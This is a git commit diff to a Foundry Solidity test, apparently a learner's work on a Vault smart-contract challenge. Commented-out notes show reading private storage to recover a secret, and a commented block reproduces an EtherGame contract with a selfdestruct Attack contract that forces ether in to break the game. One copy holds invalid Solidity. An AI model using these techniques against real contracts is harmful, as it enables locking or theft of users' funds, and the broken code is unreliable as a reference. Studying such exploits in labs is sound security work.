1214075b930fb492a568c7b60a0b17eb1a502011
Juan_Fuente_T <jfuentet@gmail.com>
2023-09-15 21:18:57 +0200

    Vault 15-09-23

--- test/Vault.t.sol
+++ test/Vault.t.sol
@@ -7,12 +7,93 @@ import "../src/Vault.sol";
 
 contract VaultTest is Test {
     Vault public vault;
+    address public Juan;
 
     function setUp() public {
         vault = new Vault{value: 0.0001 ether}();
+        Juan = makeAddr("Juan");
+        
     }
 
     function testVault() public{
-        
+        vm.startPrank(Juan);
+        vm.deal(Juan, 0.0001 ether);
+
+        (bool sent, ) = payable(address(vault)).call{value:0.0001 ether}("");
+        if (!sent){
+
+            //revert HaFallado();
+        }
+
+        console.log("Balance Vault: ",address(vault).balance);
+        //console.log("Secreto: ",address(vault)._secret);
+
+        //Web3.eth.getStorageAt(address, slotNumber = 0, 1, 2, etc., console.log)
+     
+
+       /*constructor(bytes32 secret, uint256 balance) {
+            _secret = secret;
+            _balance = balance;
+            _password = keccak256(abi.encodePacked(_secret, _balance));
+        }
+
+        function getPassword() public view returns (bytes32) {
+            return _password;
+        }
+
+        function getSecret() public view returns (bytes32) {
+            return _secret;
+        }
+
+        function calculateSecret(uint256 targetBalance) public view returns (bytes32) {
+            bytes32 calculatedPassword = keccak256(abi.encodePacked(address(vault)._secret, address(vault).balance));
+            console.log(calculatedPassword);
+        }
+}*/
     }
 }
+
+/*
+
+
+
+contract EtherGame { 
+    uint public targetAmount = 5 ether; 
+    address public winner; 
+    function play() public payable { 
+        require(msg.value == 1 ether, "You can only send 1 Ether"); 
+
+        uint balance = address(this).balance; 
+        require(balance <= targetAmount, "Game is over"); 
+
+        if (balance == targetAmount) {
+             winner = msg.sender; } } 
+    function claimReward() public { 
+        require(msg.sender == winner, "Not winner"); 
+        (bool sent, ) = msg.sender.call{value: address(this).balance}(""); require(sent, "Failed to send Ether"); } } contract Attack { EtherGame etherGame; constructor(EtherGame _etherGame) { etherGame = EtherGame(_etherGame); } function attack() public payable { address payable addr = payable(address(etherGame)); selfdestruct(addr); } }
+
+
+ pragma solidity ^0.8.10; contract EtherGame { 
+    uint public targetAmount = 5 ether; 
+    address public winner; 
+    uint public balance; 
+    function play() public payable { 
+        require(msg.value == 1 ether, "You can only send 1 Ether"); 
+        uint balance += msg.value; 
+        require(balance <= targetAmount, "Game is over"); 
+        if (balance == targetAmount) { winner = msg.sender; } } 
+    function claimReward() public { 
+        require(msg.sender == winner, "Not winner"); 
+        (bool sent, ) = msg.sender.call{value: address(this).balance}(""); 
+        require(sent, "Failed to send Ether"); } } 
+        
+        contract Attack { 
+            EtherGame etherGame; 
+            constructor(EtherGame _etherGame) { 
+                etherGame = EtherGame(_etherGame); 
+                } 
+            function attack() public payable { 
+                address payable addr = payable(address(etherGame)); 
+                selfdestruct(addr); } }
+
+*/
